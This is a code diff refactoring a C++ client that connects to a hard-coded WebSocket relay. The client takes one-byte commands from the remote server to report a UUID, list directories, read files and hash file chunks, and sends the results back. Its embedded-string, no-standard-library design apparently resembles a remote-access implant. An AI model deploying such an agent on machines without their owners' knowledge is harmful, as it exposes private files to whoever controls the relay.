@@ -1,76 +1,69 @@
-#include "terminal.h"
+#include "commands.h"
 #include "runtime.h"
 #include "websocket_client.h"
-#include "sha2.h"
 
 INT32 start()
 {
     auto url = "https://relay.nostdlib.workers.dev/ws"_embed;
-while (1)
-    {
-    LOG_INFO("Creating WebSocket client for URL: %s", (PCCHAR)url);
 
-    auto createResult = WebSocketClient::Create(url);
-    if (!createResult)
-    {
-        LOG_ERROR("Failed to open WebSocket connection to %s", (PCCHAR)url);
-        return 0;
-    }
-    WebSocketClient &wsClient = createResult.Value();
-    LOG_INFO("WebSocket connection opened successfully to %s", (PCCHAR)url);
+    CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
+    commandHandlers[CommandType::GetUUID] = EMBED_FUNC(Handle_GetUUIDCommand);
+    commandHandlers[CommandType::GetDirectoryContent] = EMBED_FUNC(Handle_GetDirectoryContentCommand);
+    commandHandlers[CommandType::GetFileContent] = EMBED_FUNC(Handle_GetFileContentCommand);
+    commandHandlers[CommandType::GetFileChunkHash] = EMBED_FUNC(Handle_GetFileChunkHashCommand);
 
     while (1)
     {
-        auto readResult = wsClient.Read();
+        LOG_INFO("Creating WebSocket client for URL: %s", (PCCHAR)url);
 
-        if (!readResult.IsOk())
+        auto createResult = WebSocketClient::Create(url);
+        if (!createResult)
         {
-            LOG_ERROR("Failed to read message from WebSocket server");
-            break;
+            LOG_ERROR("Failed to open WebSocket connection to %s", (PCCHAR)url);
+            return 0;
         }
+        WebSocketClient &wsClient = createResult.Value();
+        LOG_INFO("WebSocket connection opened successfully to %s", (PCCHAR)url);
 
-        PCHAR command = (PCHAR)(readResult.Value().Data);
-        UINT8 commandType = command[0];
-        command++;
-        USIZE commandLength = readResult.Value().Length - sizeof(UINT8);
-
-        WebSocketOpcode opcode = readResult.Value().Opcode;
-
-        LOG_INFO("Received message (opcode: %d, length: %d)", (INT32)opcode, (INT32)commandLength);
-
-        PCHAR response = nullptr;
-        USIZE responseLength = sizeof(UINT32); // Default response length for error code
-
-        void (*commandHandlers[4])(PCHAR, USIZE, PCHAR *, PUSIZE) = {nullptr};
-
-        commandHandlers[CommandType::GetUUID] = EMBED_FUNC(Handle_GetUUIDCommand);
-        commandHandlers[CommandType::GetDirectoryContent] = EMBED_FUNC(Handle_GetDirectoryContentCommand);
-        commandHandlers[CommandType::GetFileContent] = EMBED_FUNC(Handle_GetFileContentCommand);
-        commandHandlers[CommandType::GetFileChunkHash] = EMBED_FUNC(Handle_GetFileChunkHashCommand);
-
-        if (commandType >= CommandType::GetUUID && commandType <= CommandType::GetFileChunkHash)
+        while (1)
         {
-            commandHandlers[commandType](command, commandLength, &response, &responseLength);
-        }
-        else
-        {
-            LOG_ERROR("Unknown command type received: %d", (INT32)commandType);
-            response = new CHAR[responseLength]; // Only return error code
-            *(PUINT32)response = 2;              // Example error code for unknown command
-        }
+            auto readResult = wsClient.Read();
+            if (!readResult.IsOk())
+            {
+                LOG_ERROR("Failed to read message from WebSocket server");
+                break;
+            }
 
-        auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
-        if (!writeResult)
-        {
-            LOG_ERROR("Failed to send response to WebSocket server");
+            PCHAR command = (PCHAR)(readResult.Value().Data);
+            UINT8 commandType = command[0];
+            command++;
+            USIZE commandLength = readResult.Value().Length - sizeof(UINT8);
+            LOG_INFO("Received message (opcode: %d, length: %d)", (INT32)readResult.Value().Opcode, (INT32)commandLength);
+
+            PCHAR response = nullptr;
+            USIZE responseLength = sizeof(UINT32);
+
+            if (commandType < CommandType::CommandTypeCount && commandHandlers[commandType])
+            {
+                commandHandlers[commandType](command, commandLength, &response, &responseLength);
+            }
+            else
+            {
+                LOG_ERROR("Unknown command type received: %d", (INT32)commandType);
+                response = new CHAR[responseLength];
+                *(PUINT32)response = StatusCode::UnknownCommand;
+            }
+
+            auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
             delete[] response;
-            break;
+
+            if (!writeResult)
+            {
+                LOG_ERROR("Failed to send response to WebSocket server");
+                break;
+            }
+            LOG_INFO("Response sent successfully to WebSocket server (length: %u)", (UINT32)responseLength);
         }
-        LOG_INFO("Response sent successfully to WebSocket server (length: %u)", (UINT32)responseLength);
-        delete[] response;
-        response = nullptr;
-        responseLength = 0;
     }
-}
     return 1;
 }
